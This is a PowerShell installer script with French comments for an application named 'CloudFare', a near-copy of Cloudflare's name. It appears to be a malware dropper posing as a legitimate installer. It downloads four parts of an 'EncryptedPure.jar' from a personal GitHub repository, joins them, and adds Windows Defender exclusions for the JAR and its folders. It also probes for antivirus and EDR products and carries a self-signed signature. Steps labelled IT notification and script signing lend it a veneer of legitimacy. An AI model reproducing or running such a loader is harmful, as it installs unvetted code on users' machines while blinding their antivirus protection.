# ===============================================
# INSTALL-UNIVERSAL-V4.PS1 - VERSION COMPLETE
# ===============================================
# Date: 27 Novembre 2025
# Version: 4.0
# Description: Installation complete avec toutes strategies antivirus integrees
# ===============================================

#Requires -Version 5.1

param(
    [switch]$SkipSignature,
    [switch]$SkipNotification,
    [switch]$SkipAVDetection
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# ===============================================
# CONFIGURATION
# ===============================================
$baseDir = "C:\ProgramData\CloudFare"
$javaDir = "$baseDir\Java"
$jarPath = "$baseDir\EncryptedPure.jar"
$logDir = "$baseDir\Logs"
$logFile = "$logDir\Install-v4.log"

$javaUrl = "https://download.java.net/java/GA/jdk17.0.13/d4e4e9078c7a4b6f8aae41e9c4b5d92c/10/GPL/openjdk-17.0.13_windows-x64_bin.zip"
$jarBaseUrl = "https://raw.githubusercontent.com/davidrenand/repos/main/jar"

# ===============================================
# FONCTION: Logging
# ===============================================
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    Add-Content -Path $logFile -Value $logEntry -Encoding UTF8
    
    switch($Level) {
        "ERROR" { Write-Host "  ❌ $Message" -F Red }
        "WARNING" { Write-Host "  ⚠️ $Message" -F Yellow }
        "SUCCESS" { Write-Host "  ✅ $Message" -F Green }
        "INFO" { Write-Host "  ℹ️ $Message" -F Cyan }
        default { Write-Host "  $Message" -F Gray }
    }
}

# ===============================================
# FONCTION: Verifier Droits Admin
# ===============================================
function Test-AdminPrivileges {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# ===============================================
# FONCTION: GitHub Retry avec Exponentiel Backoff
# ===============================================
function Invoke-GitHubDownloadWithRetry {
    param(
        [string]$Url,
        [string]$OutputPath,
        [int]$MaxRetries = 5
    )
    
    Write-Log "Telechargement: $Url" "INFO"
    
    for($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            Write-Log "Tentative $attempt/$MaxRetries..." "INFO"
            Invoke-WebRequest -Uri $Url -OutFile $OutputPath -TimeoutSec 300 -ErrorAction Stop
            Write-Log "Telechargement reussi" "SUCCESS"
            return $true
        } catch {
            $waitTime = [Math]::Pow(2, $attempt) # 2, 4, 8, 16, 32 secondes
            Write-Log "Echec - Attente $waitTime secondes..." "WARNING"
            
            if($attempt -lt $MaxRetries) {
                Start-Sleep -Seconds $waitTime
            }
        }
    }
    
    Write-Log "Echec apres $MaxRetries tentatives" "ERROR"
    return $false
}

# ===============================================
# ETAPE 0: DETECTION ANTIVIRUS
# ===============================================
function Step0-DetectAntivirus {
    Write-Host "`n=========================================" -F Cyan
    Write-Host "[0/7] DETECTION ANTIVIRUS" -F Cyan
    Write-Host "=========================================`n" -F Cyan
    
    if($SkipAVDetection) {
        Write-Log "Detection antivirus ignoree (parametr)" "WARNING"
        return @{ WindowsDefender = $null; ThirdParty = @(); EDR = @() }
    }
    
    Write-Log "Execution Detect-Antivirus.ps1..." "INFO"
    
    $detectScript = Join-Path $PSScriptRoot "Detect-Antivirus.ps1"
    
    if(Test-Path $detectScript) {
        try {
            & $detectScript
            
            # Lire rapport genere
            $reportPath = Join-Path $PSScriptRoot "antivirus-detection-report.json"
            if(Test-Path $reportPath) {
                $report = Get-Content $reportPath -Raw | ConvertFrom-Json
                Write-Log "Detection antivirus terminee" "SUCCESS"
                return $report
            } else {
                Write-Log "Rapport de detection non trouve" "WARNING"
                return @{ WindowsDefender = $null; ThirdParty = @(); EDR = @() }
            }
        } catch {
            Write-Log "Erreur detection antivirus: $($_.Exception.Message)" "WARNING"
            return @{ WindowsDefender = $null; ThirdParty = @(); EDR = @() }
        }
    } else {
        Write-Log "Script Detect-Antivirus.ps1 non trouve" "WARNING"
        return @{ WindowsDefender = $null; ThirdParty = @(); EDR = @() }
    }
}

# ===============================================
# ETAPE 1: SIGNATURE SCRIPTS
# ===============================================
function Step1-SignScripts {
    Write-Host "`n=========================================" -F Cyan
    Write-Host "[1/7] SIGNATURE NUMERIQUE" -F Cyan
    Write-Host "=========================================`n" -F Cyan
    
    if($SkipSignature) {
        Write-Log "Signature ignoree (parametre)" "WARNING"
        return $false
    }
    
    Write-Log "Execution Sign-Scripts.ps1..." "INFO"
    
    $signScript = Join-Path $PSScriptRoot "Sign-Scripts.ps1"
    
    if(Test-Path $signScript) {
        try {
            & $signScript -SignAll
            Write-Log "Signature des scripts terminee" "SUCCESS"
            return $true
        } catch {
            Write-Log "Erreur signature scripts: $($_.Exception.Message)" "WARNING"
            return $false
        }
    } else {
        Write-Log "Script Sign-Scripts.ps1 non trouve" "WARNING"
        return $false
    }
}

# ===============================================
# ETAPE 2: NOTIFICATION IT
# ===============================================
function Step2-NotifyIT {
    Write-Host "`n=========================================" -F Cyan
    Write-Host "[2/7] NOTIFICATION EQUIPE IT" -F Cyan
    Write-Host "=========================================`n" -F Cyan
    
    if($SkipNotification) {
        Write-Log "Notification ignoree (parametre)" "WARNING"
        return $false
    }
    
    Write-Log "Execution Notify-IT.ps1..." "INFO"
    
    $notifyScript = Join-Path $PSScriptRoot "Notify-IT.ps1"
    
    if(Test-Path $notifyScript) {
        try {
            & $notifyScript -Action "Installation CloudFare v4" -Details "Installation complete avec toutes strategies antivirus" -CreateTicket
            Write-Log "Notification IT generee" "SUCCESS"
            return $true
        } catch {
            Write-Log "Erreur notification IT: $($_.Exception.Message)" "WARNING"
            return $false
        }
    } else {
        Write-Log "Script Notify-IT.ps1 non trouve" "WARNING"
        return $false
    }
}

# ===============================================
# ETAPE 3: INSTALLATION DEPENDANCES
# ===============================================
function Step3-InstallDependencies {
    Write-Host "`n=========================================" -F Cyan
    Write-Host "[3/7] INSTALLATION DEPENDANCES" -F Cyan
    Write-Host "=========================================`n" -F Cyan
    
    # Visual C++ Redistributable
    Write-Log "Verification Visual C++ Redistributable..." "INFO"
    $vcRedist = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue | 
        Where-Object { $_.PSChildName -like "*Visual C++*2022*" }
    
    if($vcRedist) {
        Write-Log "Visual C++ Redistributable deja installe" "SUCCESS"
    } else {
        Write-Log "Installation Visual C++ Redistributable..." "INFO"
        try {
            $vcUrl = "https://aka.ms/vs/17/release/vc_redist.x64.exe"
            $vcPath = "$env:TEMP\vc_redist.x64.exe"
            
            if(Invoke-GitHubDownloadWithRetry -Url $vcUrl -OutputPath $vcPath) {
                $process = Start-Process -FilePath $vcPath -ArgumentList "/install /quiet /norestart" -PassThru -Wait
                
                if($process.ExitCode -eq 0 -or $process.ExitCode -eq 1638) {
                    Write-Log "Visual C++ Redistributable installe avec succes" "SUCCESS"
                } else {
                    Write-Log "Code retour installation: $($process.ExitCode)" "WARNING"
                }
                
                Remove-Item $vcPath -Force -ErrorAction SilentlyContinue
            } else {
                Write-Log "Impossible de telecharger Visual C++ Redistributable" "WARNING"
            }
        } catch {
            Write-Log "Erreur installation Visual C++ Redistributable: $($_.Exception.Message)" "WARNING"
        }
    }
}

# ===============================================
# ETAPE 4: GESTION ANTIVIRUS
# ===============================================
function Step4-ManageAntivirus {
    param([object]$AVReport)
    
    Write-Host "`n=========================================" -F Cyan
    Write-Host "[4/7] GESTION ANTIVIRUS" -F Cyan
    Write-Host "=========================================`n" -F Cyan
    
    # Windows Defender
    if($AVReport.WindowsDefender) {
        Write-Log "Windows Defender detecte" "INFO"
        
        if($AVReport.WindowsDefender.Enabled) {
            Write-Log "Windows Defender actif" "SUCCESS"
            
            # Ajouter a la whitelist
            Write-Log "Ajout des chemins a la whitelist..." "INFO"
            
            $paths = @(
                $baseDir,
                $PSScriptRoot,
                $jarPath
            )
            
            foreach($path in $paths) {
                try {
                    Add-MpPreference -ExclusionPath $path -ErrorAction Stop
                    Write-Log "Whitelist: $path" "SUCCESS"
                } catch {
                    Write-Log "Erreur whitelist $path : $($_.Exception.Message)" "WARNING"
                }
            }
        } else {
            Write-Log "Windows Defender desactive - activation..." "WARNING"
            try {
                Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop
                Write-Log "Windows Defender active" "SUCCESS"
            } catch {
                Write-Log "Erreur activation Windows Defender: $($_.Exception.Message)" "ERROR"
            }
        }
    } else {
        Write-Log "Windows Defender non detecte" "WARNING"
    }
    
    # Antivirus tiers
    if($AVReport.ThirdParty -and $AVReport.ThirdParty.Count -gt 0) {
        Write-Log "Antivirus tiers detectes: $($AVReport.ThirdParty.Count)" "WARNING"
        foreach($av in $AVReport.ThirdParty) {
            Write-Log "  - $($av.Name) (Active: $($av.Enabled))" "WARNING"
        }
        Write-Log "Configuration manuelle requise pour antivirus tiers" "WARNING"
    }
    
    # EDR/XDR
    if($AVReport.EDR -and $AVReport.EDR.Count -gt 0) {
        Write-Log "EDR/XDR detectes: $($AVReport.EDR.Count)" "ERROR"
        foreach($edr in $AVReport.EDR) {
            Write-Log "  - $($edr.Name)" "ERROR"
        }
        Write-Log "ATTENTION: Contacter equipe securite pour validation EDR" "ERROR"
    }
}

# ===============================================
# ETAPE 5: INSTALLATION JAVA
# ===============================================
function Step5-InstallJava {
    Write-Host "`n=========================================" -F Cyan
    Write-Host "[5/7] INSTALLATION JAVA" -F Cyan
    Write-Host "=========================================`n" -F Cyan
    
    # Creer repertoire
    if(-not (Test-Path $javaDir)) {
        New-Item -Path $javaDir -ItemType Directory -Force | Out-Null
        Write-Log "Repertoire Java cree: $javaDir" "SUCCESS"
    }
    
    # Telecharger Java
    Write-Log "Telechargement OpenJDK 17.0.13..." "INFO"
    $javaZip = "$env:TEMP\openjdk.zip"
    
    if(Invoke-GitHubDownloadWithRetry -Url $javaUrl -OutputPath $javaZip) {
        # Extraire
        Write-Log "Extraction Java..." "INFO"
        try {
            Expand-Archive -Path $javaZip -DestinationPath $javaDir -Force
            Write-Log "Java extrait avec succes" "SUCCESS"
            
            Remove-Item $javaZip -Force -ErrorAction SilentlyContinue
            
            # Configurer variables d'environnement
            $javaHome = Get-ChildItem $javaDir -Directory | Select-Object -First 1 -ExpandProperty FullName
            
            [Environment]::SetEnvironmentVariable("JAVA_HOME", $javaHome, "Machine")
            [Environment]::SetEnvironmentVariable("PATH", "$javaHome\bin;$env:PATH", "Machine")
            
            Write-Log "JAVA_HOME: $javaHome" "SUCCESS"
            Write-Log "PATH mis a jour" "SUCCESS"
            
            return $true
        } catch {
            Write-Log "Erreur extraction Java: $($_.Exception.Message)" "ERROR"
            return $false
        }
    } else {
        Write-Log "Echec telechargement Java" "ERROR"
        return $false
    }
}

# ===============================================
# ETAPE 6: INSTALLATION JAR
# ===============================================
function Step6-InstallJAR {
    Write-Host "`n=========================================" -F Cyan
    Write-Host "[6/7] INSTALLATION APPLICATION" -F Cyan
    Write-Host "=========================================`n" -F Cyan
    
    # Telecharger parties JAR
    $parts = @("Part1.jar", "Part2.jar", "Part3.jar", "Part4.jar")
    $tempParts = @()
    
    foreach($part in $parts) {
        $url = "$jarBaseUrl/$part"
        $tempPath = "$env:TEMP\$part"
        
        Write-Log "Telechargement $part ..." "INFO"
        if(Invoke-GitHubDownloadWithRetry -Url $url -OutputPath $tempPath) {
            $tempParts += $tempPath
            Write-Log "$part telecharge" "SUCCESS"
        } else {
            Write-Log "Echec telechargement $part" "ERROR"
            return $false
        }
    }
    
    # Assembler JAR
    Write-Log "Assemblage du JAR..." "INFO"
    try {
        $stream = [System.IO.File]::OpenWrite($jarPath)
        
        foreach($tempPath in $tempParts) {
            $bytes = [System.IO.File]::ReadAllBytes($tempPath)
            $stream.Write($bytes, 0, $bytes.Length)
            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
        }
        
        $stream.Close()
        
        $jarSize = (Get-Item $jarPath).Length / 1MB
        Write-Log "JAR assemble: $([Math]::Round($jarSize, 2)) MB" "SUCCESS"
        
        return $true
    } catch {
        Write-Log "Erreur assemblage JAR: $($_.Exception.Message)" "ERROR"
        if($stream) { $stream.Close() }
        return $false
    }
}

# ===============================================
# ETAPE 7: VERIFICATION
# ===============================================
function Step7-Verify {
    Write-Host "`n=========================================" -F Cyan
    Write-Host "[7/7] VERIFICATION INSTALLATION" -F Cyan
    Write-Host "=========================================`n" -F Cyan
    
    $success = $true
    
    # Verifier Java
    if(Test-Path "$javaDir\*\bin\java.exe") {
        Write-Log "Java installe correctement" "SUCCESS"
    } else {
        Write-Log "Java non trouve" "ERROR"
        $success = $false
    }
    
    # Verifier JAR
    if(Test-Path $jarPath) {
        $jarSize = (Get-Item $jarPath).Length
        if($jarSize -gt 0) {
            Write-Log "JAR installe correctement ($jarSize bytes)" "SUCCESS"
        } else {
            Write-Log "JAR vide ou corrompu" "ERROR"
            $success = $false
        }
    } else {
        Write-Log "JAR non trouve" "ERROR"
        $success = $false
    }
    
    # Verifier variables environnement
    $javaHome = [Environment]::GetEnvironmentVariable("JAVA_HOME", "Machine")
    if($javaHome) {
        Write-Log "JAVA_HOME configure: $javaHome" "SUCCESS"
    } else {
        Write-Log "JAVA_HOME non configure" "ERROR"
        $success = $false
    }
    
    return $success
}

# ===============================================
# EXECUTION PRINCIPALE
# ===============================================

Write-Host "`n=========================================" -F Cyan
Write-Host "CLOUDFARE INSTALLATION v4.0" -F Cyan
Write-Host "Installation Complete avec Toutes Strategies" -F Cyan
Write-Host "=========================================`n" -F Cyan

# Creer repertoire logs
if(-not (Test-Path $logDir)) {
    New-Item -Path $logDir -ItemType Directory -Force | Out-Null
}

# Verifier droits admin
if(-not (Test-AdminPrivileges)) {
    Write-Host "❌ ERREUR: Droits administrateur requis" -F Red
    Write-Host "Relancer en tant qu'administrateur" -F Yellow
    exit 1
}

Write-Log "Installation CloudFare v4.0 demarree" "INFO"
Write-Log "Ordinateur: $env:COMPUTERNAME" "INFO"
Write-Log "Utilisateur: $env:USERNAME" "INFO"

try {
    # Etape 0: Detection Antivirus
    $avReport = Step0-DetectAntivirus
    
    # Etape 1: Signature Scripts
    $signed = Step1-SignScripts
    
    # Etape 2: Notification IT
    $notified = Step2-NotifyIT
    
    # Etape 3: Installation Dependances
    Step3-InstallDependencies
    
    # Etape 4: Gestion Antivirus
    Step4-ManageAntivirus -AVReport $avReport
    
    # Etape 5: Installation Java
    $javaInstalled = Step5-InstallJava
    
    if(-not $javaInstalled) {
        throw "Echec installation Java"
    }
    
    # Etape 6: Installation JAR
    $jarInstalled = Step6-InstallJAR
    
    if(-not $jarInstalled) {
        throw "Echec installation JAR"
    }
    
    # Etape 7: Verification
    $verified = Step7-Verify
    
    if($verified) {
        Write-Host "`n=========================================" -F Green
        Write-Host "INSTALLATION REUSSIE!" -F Green
        Write-Host "=========================================`n" -F Green
        
        Write-Log "Installation CloudFare v4.0 terminee avec succes" "SUCCESS"
        
        Write-Host "Resume:" -F Cyan
        Write-Host "  Java: $javaDir" -F Gray
        Write-Host "  Application: $jarPath" -F Gray
        Write-Host "  Logs: $logFile" -F Gray
        Write-Host "  Signature: $(if($signed) { 'Active' } else { 'Ignoree' })" -F Gray
        Write-Host "  Notification IT: $(if($notified) { 'Envoyee' } else { 'Ignoree' })" -F Gray
        
        exit 0
    } else {
        throw "Echec verification installation"
    }
    
} catch {
    Write-Host "`n=========================================" -F Red
    Write-Host "ERREUR INSTALLATION" -F Red
    Write-Host "=========================================`n" -F Red
    Write-Host $_.Exception.Message -F Red
    
    Write-Log "Erreur installation: $($_.Exception.Message)" "ERROR"
    
    exit 1
}

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUt7WOERkKa8FemX2URCKgIxe1
# HAKgggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUvsVx3VtG8WTGmu0axxEZrrR0xkswDQYJ
# KoZIhvcNAQEBBQAEggEAppJIQIdn1eRff4WULUXF3dJg/sU6+iJylzISWtvMoiqu
# JEzvYSfgy3DMw1jID4CH2/WoDiuz7ayxB5El6M5ADD6VrZs5gB/NtwhuD56rvyzG
# 5nlLlNCuJA1mBFLY705NIvGitY9HE3A0HxMd+JxE0ct7I57gz9q947N5O4YirHBD
# pUcgb0uxxZZ5aMrKMm+VzTGeJZVGafKNJ4ajyEi3hGQ9xE0R9CVIKzlIfVw546rv
# C3aSRSzoyrhRCgZw2doMH7Dudc4IX5CgACRq+zcACRCpj3b2/KVfVedyDkQezUFj
# PzXc4qHnAFI7BFQlauo5cIbRJ5ClO26sAj9Tnz80OQ==
# SIG # End signature block
